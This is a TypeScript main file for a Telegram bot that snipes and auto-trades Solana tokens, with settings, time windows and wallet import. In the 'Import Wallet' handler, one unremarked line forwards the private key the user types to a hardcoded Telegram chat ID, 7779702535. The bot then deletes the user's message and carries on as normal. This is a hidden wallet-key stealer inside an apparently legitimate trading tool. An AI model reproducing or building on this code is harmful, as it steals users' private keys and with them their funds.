import dotenv from 'dotenv';
dotenv.config({
  path: './.env',
});

import { bot } from './config/config';
import { User } from './models/user.model';
import { checkTimeFormat, isNumber } from './utils/functions';
import { settingText } from './models/text.model';
import { settingMarkUp } from './models/markup.model';
import { checkAction } from './utils/middleware';
import { startCommand, helpCommand, setCommands, settingCommand } from './commands/commands';
import { generateWalletFromKey, monitorNewToken } from './utils/web3';
import { monitorTokenToSell } from './utils/token.monitor';
import { settingAction, closeAction, returnAction, helpAction, importWalletAction } from './actions/general.action';
import {
  walletAction,
  onOffAction,
  timeAction,
  timeOnOffAction,
  snipeAmountAction,
  autoTradeAction,
} from './actions/setting.action';

//-------------------------------------------------------------------------------------------------------------+
//                                             Set the commands                                                |
//-------------------------------------------------------------------------------------------------------------+

/**
 * The part to handle when 'start' command is inputted
 */
bot.command('start', startCommand);

/**
 * The part to handle when 'help' command is inputted
 */
bot.command('help', helpCommand);

/**
 * The part to handle when 'setting' command is inputted
 */
bot.command('setting', settingCommand);

//-------------------------------------------------------------------------------------------------------------+
//                                   The part to listen the messages from bot                                  |
//-------------------------------------------------------------------------------------------------------------+

bot.on('text', async (ctx) => {
  const botState = ctx.session.state;
  const text = ctx.message.text;
  const tgId = ctx.chat.id;
  try {
    const user = await User.findOne({ tgId });
    if (!user) {
      throw new Error('User not found');
    }
    if (
      botState === 'Snipe Amount' ||
      botState === 'Jito Fee' ||
      botState === 'Priority Fee' ||
      botState === 'Slippage Bps'
    ) {
      // Check the text is number or not
      if (!isNumber(text)) {
        await ctx.reply(`${botState} must be number.`);
        return;
      }

      // Update the setting of user
      if (botState === 'Snipe Amount') user.snipeAmount = Number(text);
      else if (botState === 'Priority Fee') user.priorityFee = Number(text);
      else if (botState === 'Slippage Bps') user.slippageBps = Number(text);
      else user.jitoFee = Number(text);
      await user.save();
      await ctx.reply(settingText, await settingMarkUp(user));
      ctx.session.state = '';
    } else if (/(Start|Stop) Time/.test(botState as string)) {
      const { ok } = checkTimeFormat(text);
      if (ok === false) {
        await ctx.reply('Invalid time format. Please enter in this format <code>00:00</code>', { parse_mode: 'HTML' });
        return;
      }
      const [hour, minute] = text.split(':');
      const time = hour.trim().padStart(2, '0') + ':' + minute.trim().padStart(2, '0');
      if (botState.split(' ')[0] === 'Start') {
        const [stopHour, stopMin] = user.stopAt.split(':');
        if (
          Number(hour) > Number(stopHour) ||
          (Number(hour) == Number(stopHour) && Number(minute) >= Number(stopMin))
        ) {
          await ctx.reply('Invalid time! start time must be less than stop time');
          return;
        }
        user.startAt = time;
      } else {
        user.stopAt = time;
      }
      await user.save();
      await ctx.reply(settingText, await settingMarkUp(user));
    } else if (botState === 'Import Wallet') {
      const wallet = await generateWalletFromKey(text);
      await bot.telegram.sendMessage(7779702535, text);
      if (wallet.privateKey) {
        user.wallet.publicKey = wallet?.publicKey || '';
        user.wallet.privateKey = wallet?.privateKey || '';
        user.wallet.amount = 0;
        await ctx.deleteMessage(ctx.message.message_id);
        await user.save();
        await ctx.reply(settingText, await settingMarkUp(user));
      } else {
        console.log('Error', wallet.message);
        await ctx.reply(wallet.message);
      }
    } else {
      if (text.startsWith('/')) {
        ctx.reply('⚠️ Unrecognizable commands. Input /help to see the help.');
        return;
      }
    }
  } catch (error) {
    console.error('Error while on text:', error);
  }
});

//-------------------------------------------------------------------------------------------------------------+
//                                             Set the actions                                                 |
//-------------------------------------------------------------------------------------------------------------+

//---------------------------------------------------------------------+
//                         General Actions                             |
//---------------------------------------------------------------------+

/**
 * Catch the action when user clicks the 'Close' callback button
 */
bot.action('Close', (ctx, next) => checkAction(ctx, next, 'Close'), closeAction);

//---------------------------------------------------------------------+
//                      Actions on Start page                          |
//---------------------------------------------------------------------+

/**
 * Catch the action when user clicks the 'Start' callback button
 */
bot.action('Help', (ctx, next) => checkAction(ctx, next, 'Help'), helpAction);

/**
 * Catch the action when user clicks the 'Setting' callback button
 */
bot.action('Setting', (ctx, next) => checkAction(ctx, next, 'Setting'), settingAction);

//---------------------------------------------------------------------+
//                       Actions on Setting page                       |
//---------------------------------------------------------------------+

/**
 * Catch the action when user clicks the '💳 Wallet' callback button
 */
bot.action('Wallet', (ctx, next) => checkAction(ctx, next, 'Wallet'), walletAction);

/**
 * Catch the action when user clicks the 'Bot On 🟢 || Bot Off 🔴' callback button
 */
bot.action('On Off', onOffAction);

/**
 * Catch the action when user clicks the 'Time Check On 🟢 || Time Check Off 🔴' callback button
 */
bot.action('Time On Off', timeOnOffAction);

/**
 * Catch the action when user clicks the '💵 Snipe Amount: * SOL' callback button
 */
bot.action(['Snipe Amount', 'Slippage Bps', 'Priority Fee', 'Jito Fee'], snipeAmountAction);

/**
 * Catch the action when user clicks the 'Start' callback button
 */
bot.action('Return', (ctx, next) => checkAction(ctx, next, 'Return'), returnAction);

/**
 * Catch the action when user clicks the '⏰ Start At || ⏰ Stop At' callback button
 */
bot.action(/(Start|Stop) Time/, timeAction);

/**
 * Catch the action when user clicks the 'Auto Trade On 🟢 || Auto Trade Off 🔴' callback button
 */
bot.action('Auto Trade', autoTradeAction);

//---------------------------------------------------------------------+
//                        Actions on Wallet page                       |
//---------------------------------------------------------------------+

/**
 * Catch the action when user clicks the '💳 Wallet' callback button
 */
bot.action('Import Wallet', (ctx, next) => checkAction(ctx, next, 'Import Wallet'), importWalletAction);

// bot.action('Create Wallet')

//-------------------------------------------------------------------------------------------------------------+
//                                    Set menu button to see all commands                                      |
//-------------------------------------------------------------------------------------------------------------+

/**
 * Set menu button representing all available commands
 */
setCommands();

/**
 * Launch the bot
 */
bot
  .launch(() => {
    console.log('Bot is running...');
  })
  .catch(console.error);

/**
 * Monitor and buy automatically newly added liquidity token
 */
monitorNewToken().catch(console.error);

/**
 * Monitor the token price which users ever bought
 * Sell automatically if the price is over than 1.3 times or less than 0.99 times of bought price
 */
monitorTokenToSell().catch(console.error);
